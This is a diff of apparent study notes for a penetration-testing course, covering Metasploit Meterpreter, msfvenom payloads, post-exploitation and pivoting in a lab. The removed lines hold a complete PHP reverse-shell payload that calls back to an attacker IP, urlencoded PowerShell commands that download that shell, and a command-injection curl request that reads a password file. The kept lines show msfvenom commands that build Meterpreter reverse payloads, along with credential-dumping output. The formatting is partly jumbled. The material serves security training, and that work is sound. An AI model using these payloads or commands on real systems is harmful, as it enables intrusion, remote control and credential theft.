@@ -1785,19 +1785,6 @@ Launch the exploit by entering run, wihtout setting a `LURI` value.
 
 In a pentest, we can use this payload to improve our chances of bypassing security technologies and defenders.  However, MSF is well known and detection rates of Meterpreter payloads are high.  Therefore we should always attempt to obtain an initial foothold with a raw TCP shell and deploy Meterpreter shell once we have disabled or bypassed security technology.
 
-###### Exercises
-
-Follow the steps from this section and launch the exploit module with the Meterpreter payload payload/linux/x64/meterpreter_reverse_https. Once a session is spawned, use the search command within the Meterpreter command prompt and search for a file named passwords. Display the output of this file to obtain the flag.
-</code></pre>
-<h1>meterpreter &gt; search -f passwords
-Found 1 result...</h1>
-<p>Path            Size (bytes)  Modified (UTC)</p>
-<hr>
-<p>/opt/passwords  37            2023-11-21 07:26:19 -0800</p>
-<p>meterpreter &gt; cat /opt/passwords
-OS{fc62308419a67ed9611856e6a116c11d}</p>
-<pre><code>
-
 ##### Executable Payloads
 
 Metasploit can also export payloads into various types of files, Win bins, Linux bins, and webshells for example.  Metasploit contains [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) as a standalone tool for generating these payloads.  It provides standardized command options and various techniques to customize payloads.
@@ -1978,204 +1965,53 @@ msf6 exploit(multi/handler) &gt;
 <li>Create web shells to exploit web app vulns.</li>
 <li>Use generated files as part of a client side attack.</li>
 </ul>
-<h6>Exercises</h6>
-<p>Follow the steps from this section and use msfvenom to create a Windows binary with a staged TCP reverse shell payload. Start a multi/handler within Metasploit to receive the staged reverse shell from VM #1 once you execute the executable file on the system. Enter the command to list all payloads of msfvenom.</p>
-<pre><code>msfvenom -l payloads
-</code></pre>
-<p>Use msfvenom to create a PHP web shell (bind or reverse shell), rename the PHP file extension to .pHP (as we did in the Module &quot;Common Web Application Attacks&quot; in the section &quot;Using Executable Files&quot;), and upload it to VM #2 to obtain an interactive shell. The flag is located in C:\xampp\passwords.txt.</p>
-<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
-└─$ msfvenom -p php/reverse_php LHOST=192.168.45.182 LPORT=443 --platform php -o webrevshell.php    
-[-] No arch selected, selecting arch: php from the payload
-No encoder specified, outputting raw payload
-Payload size: 2957 bytes
-Saved as: webrevshell.php
-                                                                                         
+<h5>XAMPP Default Passwords</h5>
+<ol>
+<li><p>MySQL (phpMyAdmin):</p>
+<p>User: root
+Password:
+(means no password!)</p>
+</li>
+<li><p>FileZilla FTP:</p>
+<p>[ You have to create a new user on the FileZilla Interface ] </p>
+</li>
+<li><p>Mercury (not in the USB &amp; lite version): </p>
+<p>Postmaster: Postmaster (postmaster@localhost)
+Administrator: Admin (admin@localhost)</p>
+<p>User: newuser<br>Password: wampp </p>
+</li>
+<li><p>WEBDAV: </p>
+<p>User: xampp-dav-unsecure
+Password: ppmax2011
+Attention: WEBDAV is not active since XAMPP Version 1.7.4.
+For activation please comment out the httpd-dav.conf and
+following modules in the httpd.conf</p>
+<p>LoadModule dav_module modules/mod_dav.so
+LoadModule dav_fs_module modules/mod_dav_fs.so  </p>
+<p>Please do not forget to refresh the WEBDAV authentification (users and passwords).     </p>
+</li>
+<li><p>SuperPassword (For everything):
+User: mountainadmin
+Password: OS{bf12259a466c7e76928a797bc1f7e508}
+Attention: This user can do everything in our company.. Use with care!</p>
+</li>
+</ol>
+<pre><code>
+#### 20.3 Performing Post-Exploitation with Metasploit
+ 
+- Use core Meterpreter post-exploitation features.
+- Use post-exploitation modules.
+- Perform pivoting with Metasploit.
+
+##### Core Meterpreter Post-Exploitation Features
+
+We used Meterpreter payloads to navigate the FS in the prior section, obtaining info about the target sys, and transftering files to/from our attacking machine.  Apart from these, Meterpreter also contains numerous post-exploitation features.
+
+Let&#39;s explor these features, note that the Linux Mterpreter payload contains less post-exploitation features than the Windows version.  Therefore we will explore these on Win target ITWK01.  Let&#39;s assume we already gained an initial foothold on the target system and deployed a bind shell to access the system.
+
+First, we&#39;ll create a Win bin with msfvenom containing a non-staged Meterpreter payload names `met.exe`
+```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
-└─$ ls          
-modrc  nonstaged.exe  staged.exe  webrevshell.php
-                                                                                         
-┌──(operator@labhost)-[~/OffSec/msf]
-└─$ cat webrevshell.php 
-    /*&lt;?php /**/
-      @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set(&#39;max_execution_time&#39;,0);
-      $dis=@ini_get(&#39;disable_functions&#39;);
-      if(!empty($dis)){
-        $dis=preg_replace(&#39;/[, ]+/&#39;,&#39;,&#39;,$dis);
-        $dis=explode(&#39;,&#39;,$dis);
-        $dis=array_map(&#39;trim&#39;,$dis);
-      }else{
-        $dis=array();
-      }
-      
-    $ipaddr=&#39;192.168.45.182&#39;;
-    $port=443;
-
-    if(!function_exists(&#39;QuMOnN&#39;)){
-      function QuMOnN($c){
-        global $dis;
-        
-      if (FALSE !== stristr(PHP_OS, &#39;win&#39; )) {
-        $c=$c.&quot; 2&gt;&amp;1\n&quot;;
-      }
-      $MEDV=&#39;is_callable&#39;;
-      $reLY=&#39;in_array&#39;;
-      
-      if($MEDV(&#39;shell_exec&#39;)&amp;&amp;!$reLY(&#39;shell_exec&#39;,$dis)){
-        $o=`$c`;
-      }else
-      if($MEDV(&#39;system&#39;)&amp;&amp;!$reLY(&#39;system&#39;,$dis)){
-        ob_start();
-        system($c);
-        $o=ob_get_contents();
-        ob_end_clean();
-      }else
-      if($MEDV(&#39;proc_open&#39;)&amp;&amp;!$reLY(&#39;proc_open&#39;,$dis)){
-        $handle=proc_open($c,array(array(&#39;pipe&#39;,&#39;r&#39;),array(&#39;pipe&#39;,&#39;w&#39;),array(&#39;pipe&#39;,&#39;w&#39;)),$pipes);
-        $o=NULL;
-        while(!feof($pipes[1])){
-          $o.=fread($pipes[1],1024);
-        }
-        @proc_close($handle);
-      }else
-      if($MEDV(&#39;popen&#39;)&amp;&amp;!$reLY(&#39;popen&#39;,$dis)){
-        $fp=popen($c,&#39;r&#39;);
-        $o=NULL;
-        if(is_resource($fp)){
-          while(!feof($fp)){
-            $o.=fread($fp,1024);
-          }
-        }
-        @pclose($fp);
-      }else
-      if($MEDV(&#39;exec&#39;)&amp;&amp;!$reLY(&#39;exec&#39;,$dis)){
-        $o=array();
-        exec($c,$o);
-        $o=join(chr(10),$o).chr(10);
-      }else
-      if($MEDV(&#39;passthru&#39;)&amp;&amp;!$reLY(&#39;passthru&#39;,$dis)){
-        ob_start();
-        passthru($c);
-        $o=ob_get_contents();
-        ob_end_clean();
-      }else
-      {
-        $o=0;
-      }
-    
-        return $o;
-      }
-    }
-    $nofuncs=&#39;no exec functions&#39;;
-    if(is_callable(&#39;fsockopen&#39;)and!in_array(&#39;fsockopen&#39;,$dis)){
-      $s=@fsockopen(&quot;tcp://192.168.45.182&quot;,$port);
-      while($c=fread($s,2048)){
-        $out = &#39;&#39;;
-        if(substr($c,0,3) == &#39;cd &#39;){
-          chdir(substr($c,3,-1));
-        } else if (substr($c,0,4) == &#39;quit&#39; || substr($c,0,4) == &#39;exit&#39;) {
-          break;
-        }else{
-          $out=QuMOnN(substr($c,0,-1));
-          if($out===false){
-            fwrite($s,$nofuncs);
-            break;
-          }
-        }
-        fwrite($s,$out);
-      }
-      fclose($s);
-    }else{
-      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
-      @socket_connect($s,$ipaddr,$port);
-      @socket_write($s,&quot;socket_create&quot;);
-      while($c=@socket_read($s,2048)){
-        $out = &#39;&#39;;
-        if(substr($c,0,3) == &#39;cd &#39;){
-          chdir(substr($c,3,-1));
-        } else if (substr($c,0,4) == &#39;quit&#39; || substr($c,0,4) == &#39;exit&#39;) {
-          break;
-        }else{
-          $out=QuMOnN(substr($c,0,-1));
-          if($out===false){
-            @socket_write($s,$nofuncs);
-            break;
-          }
-        }
-        @socket_write($s,$out,strlen($out));
-      }
-      @socket_close($s);
-    }
-    
-
-┌──(operator@labhost)-[~/OffSec/msf]
-└─$ urlencode &#39;(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell&#39;
-
-%28dir%202%3E%261%20%2A%60%7Cecho%20CMD%29%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
-                                                                                         
-┌──(operator@labhost)-[~/OffSec/msf]
-└─$ urlencode &#39;iwr -uri http://192.168.45.182/webrevshell.php -Outfile webrevshell.pHP&#39;
-iwr%20-uri%20http%3A%2F%2F192.168.45.182%2Fwebrevshell.php%20-Outfile%20webrevshell.pHP
-
-┌──(operator@labhost)-[~/OffSec/msf]
-└─$ urlencode &#39;Rename-Item -Path webrevshell.pHP -NewName webrevshell.php&#39;
-Rename-Item%20-Path%20webrevshell.pHP%20-NewName%20webrevshell.php
-
-
-curl -i -s -k -X $&#39;POST&#39; \
-    -H $&#39;Host: 192.168.226.189:8000&#39; -H $&#39;Content-Length: 60&#39; -H $&#39;Cache-Control: max-age=0&#39; -H $&#39;Upgrade-Insecure-Requests: 1&#39; -H $&#39;Origin: http://192.168.226.189:8000&#39; -H $&#39;Content-Type: application/x-www-form-urlencoded&#39; -H $&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36&#39; -H $&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#39; -H $&#39;Referer: http://192.168.226.189:8000/&#39; -H $&#39;Accept-Encoding: gzip, deflate, br&#39; -H $&#39;Accept-Language: en-US,en;q=0.9&#39; -H $&#39;Connection: close&#39; \
-    --data-binary $&#39;Archive=git+--help%3B+cat+..\\..\\..\\..\\..\\xampp\\passwords.txt&#39; \
-    $&#39;http://192.168.226.189:8000/archive&#39;
-
-
-##### XAMPP Default Passwords ###
-
-1) MySQL (phpMyAdmin):
-
-   User: root
-   Password:
-   (means no password!)
-
-2) FileZilla FTP:
-
-   [ You have to create a new user on the FileZilla Interface ] 
-
-3) Mercury (not in the USB &amp; lite version): 
-
-   Postmaster: Postmaster (postmaster@localhost)
-   Administrator: Admin (admin@localhost)
-
-   User: newuser  
-   Password: wampp 
-
-4) WEBDAV: 
-
-   User: xampp-dav-unsecure
-   Password: ppmax2011
-   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
-   For activation please comment out the httpd-dav.conf and
-   following modules in the httpd.conf
-   
-   LoadModule dav_module modules/mod_dav.so
-   LoadModule dav_fs_module modules/mod_dav_fs.so  
-   
-   Please do not forget to refresh the WEBDAV authentification (users and passwords).     
-
-5) SuperPassword (For everything):
-   User: mountainadmin
-   Password: OS{bf12259a466c7e76928a797bc1f7e508}
-   Attention: This user can do everything in our company.. Use with care!
-</code></pre>
-<h4>20.3 Performing Post-Exploitation with Metasploit</h4>
-<ul>
-<li>Use core Meterpreter post-exploitation features.</li>
-<li>Use post-exploitation modules.</li>
-<li>Perform pivoting with Metasploit.</li>
-</ul>
-<h5>Core Meterpreter Post-Exploitation Features</h5>
-<p>We used Meterpreter payloads to navigate the FS in the prior section, obtaining info about the target sys, and transftering files to/from our attacking machine.  Apart from these, Meterpreter also contains numerous post-exploitation features.</p>
-<p>Let&#39;s explor these features, note that the Linux Mterpreter payload contains less post-exploitation features than the Windows version.  Therefore we will explore these on Win target ITWK01.  Let&#39;s assume we already gained an initial foothold on the target system and deployed a bind shell to access the system.</p>
-<p>First, we&#39;ll create a Win bin with msfvenom containing a non-staged Meterpreter payload names <code>met.exe</code></p>
-<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
 └─$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.182 LPORT=443 -f exe -o met.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -2373,24 +2209,6 @@ meterpreter &gt;
 <li>Still listed in the proc list.</li>
 </ul>
 <p><em>Meterpreter offers a variety of other interesting post-exploitation modules such as hashdump, which dumps the contents of the SAM database or screenshare, which displays the target machine&#39;s desktop in real-time.</em></p>
-<h6>Exercises</h6>
-<p>Follow the steps from this section to migrate to the OneDrive.exe process of user offsec. Then, use the Meterpreter post-exploitation feature getenv to display the value of the environment variable Flag and enter it as answer to this exercise.</p>
-<pre><code>meterpreter &gt; migrate 7092
-[*] Migrating from 3500 to 7092...
-[*] Migration completed successfully.
-meterpreter &gt; getenv
-[-] None of the specified environment variables were found/set.
-meterpreter &gt; getuid
-Server username: ITWK01\offsec
-meterpreter &gt; getenv Flag
-
-Environment Variables
-=====================
-
-Variable  Value
---------  -----
-Flag      thisistheanswertothequestion
-</code></pre>
 <h5>Post-Exploitation Modules</h5>
 <p>In addition to the core functions of Meterpreter, there are several post modules we can deploy against an active session.</p>
 <p>Sessions created through attack vectors, the execution of a client side attck for instance, will likely only provide us with an unpriv shell.  If the target user is a member of the local admin group, we can elevate our shell to a high integrity level if we can bypass <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">User Account Control (UAC)</a>.</p>
@@ -2688,137 +2506,6 @@ offsec    ITWK01  1c3fb240ae45a2dc5951a043cf47040e  a914116eb78bec73deb381954642
 <ul>
 <li>We successfully retrieve the NTLM has of <code>luiza</code></li>
 </ul>
-<h6>Exercises</h6>
-<p>Follow the steps from this section and use Kiwi to retrieve the NTLM hash of user offsec. Enter it as answer to this question.</p>
-<pre><code class="language-1c3fb240ae45a2dc5951a043cf47040e">
-</code></pre>
-<p>Search for a post-exploitation module that enumerates the Windows Hosts file and launch it against an active session on VM #1. What is the domain name of the only entry of this file?</p>
-<pre><code>msf6 exploit(multi/handler) &gt; search type:post host
-
-Matching Modules
-================
-
-   #   Name                                                         Disclosure Date  Rank    Check  Description
-   -   ----                                                         ---------------  ----    -----  -----------
-   0   post/windows/gather/credentials/aim                                           normal  No     Aim credential gatherer
-   1   post/linux/busybox/set_dmz                                                    normal  No     BusyBox DMZ Configuration
-   2   post/linux/busybox/set_dns                                                    normal  No     BusyBox DNS Configuration
-   3   post/linux/busybox/enum_hosts                                                 normal  No     BusyBox Enumerate Host Names
-   4   post/windows/gather/credentials/chrome                                        normal  No     Chrome credential gatherer
-   5   post/windows/gather/credentials/comodo                                        normal  No     Comodo credential gatherer
-   6   post/windows/gather/credentials/coolnovo                                      normal  No     Coolnovo credential gatherer
-   7   post/windows/gather/credentials/thycotic_secretserver_dump   2022-08-15       manual  No     Delinea Thycotic Secret Server Dump
-   8   post/windows/gather/credentials/digsby                                        normal  No     Digsby credential gatherer
-   9   post/windows/manage/execute_dotnet_assembly                                   normal  No     Execute .net Assembly (x64 only)
-   10  post/windows/gather/credentials/flock                                         normal  No     Flock credential gatherer
-   11  post/windows/manage/forward_pageant                                           normal  No     Forward SSH Agent Requests To Remote Pageant
-   12  post/windows/gather/credentials/gadugadu                                      normal  No     Gadugadu credential gatherer
-   13  post/multi/gather/aws_ec2_instance_metadata                                   normal  No     Gather AWS EC2 Instance Metadata
-   14  post/multi/gather/minio_client                                                normal  No     Gather MinIO Client Key
-   15  post/windows/gather/credentials/icq                                           normal  No     ICQ credential gatherer
-   16  post/windows/gather/credentials/ie                                            normal  No     Ie credential gatherer
-   17  post/windows/gather/credentials/incredimail                                   normal  No     Incredimail credential gatherer
-   18  post/windows/gather/credentials/kakaotalk                                     normal  No     KakaoTalk credential gatherer
-   19  post/windows/gather/credentials/kmeleon                                       normal  No     Kmeleon credential gatherer
-   20  post/windows/gather/credentials/line                                          normal  No     LINE credential gatherer
-   21  post/linux/gather/tor_hiddenservices                                          normal  No     Linux Gather TOR Hidden Services
-   22  post/windows/gather/credentials/maxthon                                       normal  No     Maxthon credential gatherer
-   23  post/windows/gather/credentials/miranda                                       normal  No     Miranda credential gatherer
-   24  post/multi/gather/dns_bruteforce                                              normal  No     Multi Gather DNS Forward Lookup Bruteforce
-   25  post/multi/gather/dns_srv_lookup                                              normal  No     Multi Gather DNS Service Record Lookup Scan
-   26  post/multi/gather/ssh_creds                                                   normal  No     Multi Gather OpenSSH PKI Credentials Collection
-   27  post/multi/gather/resolve_hosts                                               normal  No     Multi Gather Resolve Hosts
-   28  post/multi/manage/zip                                                         normal  No     Multi Manage File Compressor
-   29  post/multi/manage/autoroute                                                   normal  No     Multi Manage Network Route via Meterpreter Session
-   30  post/linux/gather/enum_nagios_xi                             2018-04-17       normal  No     Nagios XI Enumeration
-   31  post/windows/gather/credentials/opera                                         normal  No     Opera credential gatherer
-   32  post/windows/gather/credentials/operamail                                     normal  No     Operamail credential gatherer
-   33  post/windows/gather/credentials/postbox                                       normal  No     Postbox credential gatherer
-   34  post/windows/gather/enum_putty_saved_sessions                                 normal  No     PuTTY Saved Sessions Enumeration Module
-   35  post/windows/gather/credentials/qq                                            normal  No     QQ credential gatherer
-   36  post/windows/gather/credentials/redis_desktop_manager                         normal  No     RedisDesktopManager credential gatherer
-   37  post/multi/recon/reverse_lookup                                               normal  No     Reverse Lookup IP Addresses
-   38  post/windows/gather/credentials/safari                                        normal  No     Safari credential gatherer
-   39  post/multi/gather/saltstack_salt                                              normal  No     SaltStack Salt Information Gatherer
-   40  post/windows/gather/credentials/seamonkey                                     normal  No     Seamonkey credential gatherer
-   41  post/windows/gather/credentials/solarwinds_orion_dump        2022-11-08       manual  No     SolarWinds Orion Secrets Dump
-   42  post/windows/gather/credentials/srware                                        normal  No     Srware credential gatherer
-   43  post/windows/gather/credentials/tango                                         normal  No     Tango credential gatherer
-   44  post/windows/gather/credentials/thunderbird                                   normal  No     Thunderbird credential gatherer
-   45  post/windows/gather/credentials/tlen                                          normal  No     Tlen credential gatherer
-   46  post/linux/gather/vcenter_secrets_dump                       2022-04-15       normal  No     VMware vCenter Secrets Dump
-   47  post/windows/gather/credentials/veeam_credential_dump        2022-11-22       manual  No     Veeam Backup and Replication Credentials Dump
-   48  post/windows/gather/credentials/viber                                         normal  No     Viber credential gatherer
-   49  post/windows/gather/credentials/whatsupgold_credential_dump  2022-11-22       manual  No     WhatsUp Gold Credentials Dump
-   50  post/windows/escalate/droplnk                                                 normal  No     Windows Escalate SMB Icon LNK Dropper
-   51  post/windows/gather/enum_ad_computers                                         normal  No     Windows Gather Active Directory Computers
-   52  post/windows/gather/credentials/credential_collector                          normal  No     Windows Gather Credential Collector
-   53  post/windows/gather/enum_domains                                              normal  No     Windows Gather Domain Enumeration
-   54  post/windows/gather/credentials/dyndns                                        normal  No     Windows Gather DynDNS Client Password Extractor
-   55  post/windows/gather/enum_emet                                                 normal  No     Windows Gather EMET Protected Paths
-   56  post/windows/gather/enum_domain_users                                         normal  No     Windows Gather Enumerate Active Domain Users
-   57  post/windows/gather/exchange                                                  normal  No     Windows Gather Exchange Server Mailboxes
-   58  post/windows/gather/local_admin_search_enum                                   normal  No     Windows Gather Local Admin Search
-   59  post/windows/gather/smart_hashdump                                            normal  No     Windows Gather Local and Domain Controller Account Password Hashes
-   60  post/windows/gather/enum_trusted_locations                                    normal  No     Windows Gather Microsoft Office Trusted Locations
-   61  post/windows/gather/word_unc_injector                                         normal  No     Windows Gather Microsoft Office Word UNC Path Injector
-   62  post/windows/gather/enum_proxy                                                normal  No     Windows Gather Proxy Setting
-   63  post/windows/gather/credentials/razorsql                                      normal  No     Windows Gather RazorSQL Credentials
-   64  post/windows/gather/credentials/rdc_manager_creds                             normal  No     Windows Gather Remote Desktop Connection Manager Saved Password Extraction
-   65  post/windows/gather/wmic_command                                              normal  No     Windows Gather Run WMIC Commands
-   66  post/windows/gather/screen_spy                                                normal  No     Windows Gather Screen Spy
-   67  post/windows/gather/usb_history                                               normal  No     Windows Gather USB Drive History
-   68  post/windows/gather/enum_hostfile                                             normal  No     Windows Gather Windows Host File Enumeration
-   69  post/windows/gather/enum_hyperv_vms                                           normal  No     Windows Hyper-V VM Enumeration
-   70  post/windows/gather/credentials/windowslivemail                               normal  No     Windows Live Mail credential gatherer
-   71  post/windows/manage/change_password                                           normal  No     Windows Manage Change Password
-   72  post/windows/manage/remove_host                                               normal  No     Windows Manage Host File Entry Removal
-   73  post/windows/manage/inject_host                                               normal  No     Windows Manage Hosts File Injection
-   74  post/windows/manage/pxeexploit                                                normal  No     Windows Manage PXE Exploit Server
-   75  post/windows/manage/persistence_exe                                           normal  No     Windows Manage Persistent EXE Payload Installer
-   76  post/windows/manage/priv_migrate                                              normal  No     Windows Manage Privilege Based Process Migration
-   77  post/windows/manage/ie_proxypac                                               normal  No     Windows Manage Proxy PAC File
-   78  post/windows/manage/clone_proxy_settings                                      normal  No     Windows Manage Proxy Setting Cloner
-   79  post/windows/gather/netlm_downgrade                                           normal  No     Windows NetLM Downgrade Attack
-   80  post/windows/manage/killav                                                    normal  No     Windows Post Kill Antivirus and Hips
-   81  post/windows/recon/computer_browser_discovery                                 normal  No     Windows Recon Computer Browser Discovery
-   82  post/windows/gather/credentials/xchat                                         normal  No     Xchat credential gatherer
-
-
-Interact with a module by name or index. For example info 82, use 82 or use post/windows/gather/credentials/xchat
-
-msf6 exploit(multi/handler) &gt; use 68
-msf6 post(windows/gather/enum_hostfile) &gt; show options 
-
-Module options (post/windows/gather/enum_hostfile):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   SESSION                   yes       The session to run this module on
-
-
-View the full module info with the info, or info -d command.
-
-msf6 post(windows/gather/enum_hostfile) &gt; sessions 
-
-Active sessions
-===============
-
-  Id  Name  Type                     Information            Connection
-  --  ----  ----                     -----------            ----------
-  4         meterpreter x64/windows  ITWK01\luiza @ ITWK01  192.168.45.182:443 -&gt; 192.1
-                                                            68.226.223:52810 (192.168.2
-                                                            26.223)
-
-msf6 post(windows/gather/enum_hostfile) &gt; set SESSION 4
-SESSION =&gt; 4
-msf6 post(windows/gather/enum_hostfile) &gt; run
-
-Found entries:
-[+] 10.10.10.10       secretstaging-internal.com
-[*] Hosts file saved: /root/.msf4/loot/20231123131653_execpayloads_192.168.226.223_hosts.confige_445601.txt
-[*] Post module execution completed
-</code></pre>
 <h5>Pivoting with Metasploit</h5>
 <p>The ability to pivot from on target to another is vital.  In Port Redirection and Pivoting, we learned several techniques for pivoting.  Instead of perform these manually, we can also use Metasploit to perform them.</p>
 <p>As we did previously, we&#39;ll connect to a bind shell on port 4444 of machine ITWK01.  Assume we are currently gathering info on the target, we identify a second network interface.</p>
